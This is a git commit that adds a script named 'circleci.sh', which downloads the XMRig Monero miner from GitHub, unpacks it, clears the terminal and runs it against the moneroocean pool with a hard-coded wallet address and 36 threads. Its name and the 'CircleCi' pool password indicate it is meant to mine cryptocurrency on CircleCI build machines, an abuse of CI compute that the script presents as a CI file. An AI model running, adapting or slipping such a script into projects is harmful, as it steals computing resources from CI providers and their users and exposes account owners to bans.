93e53c58f4e6b8a39df53b310c04c16715a1df46
MomboteQ <60738939+MomboteQ@users.noreply.github.com>
2022-04-29 19:55:46 +0200

    Create circleci.sh

---
+++ xmr/circleci.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+#-----CREATED BY MOMBOTEQ-----
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar xf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+clear
+./xmrig -o gulf.moneroocean.stream:10032 -u 47XoXb55DyecrQ1aaBnqXdZiDntoLvXpZTcd6g5mjLHqgx3yMvTTMccNdPnnZxoXA48DzFBGrjoVi4jko7bxTJbr6zZQjjZ -p CircleCi --threads 36
+#-----CREATED BY MOMBOTEQ-----
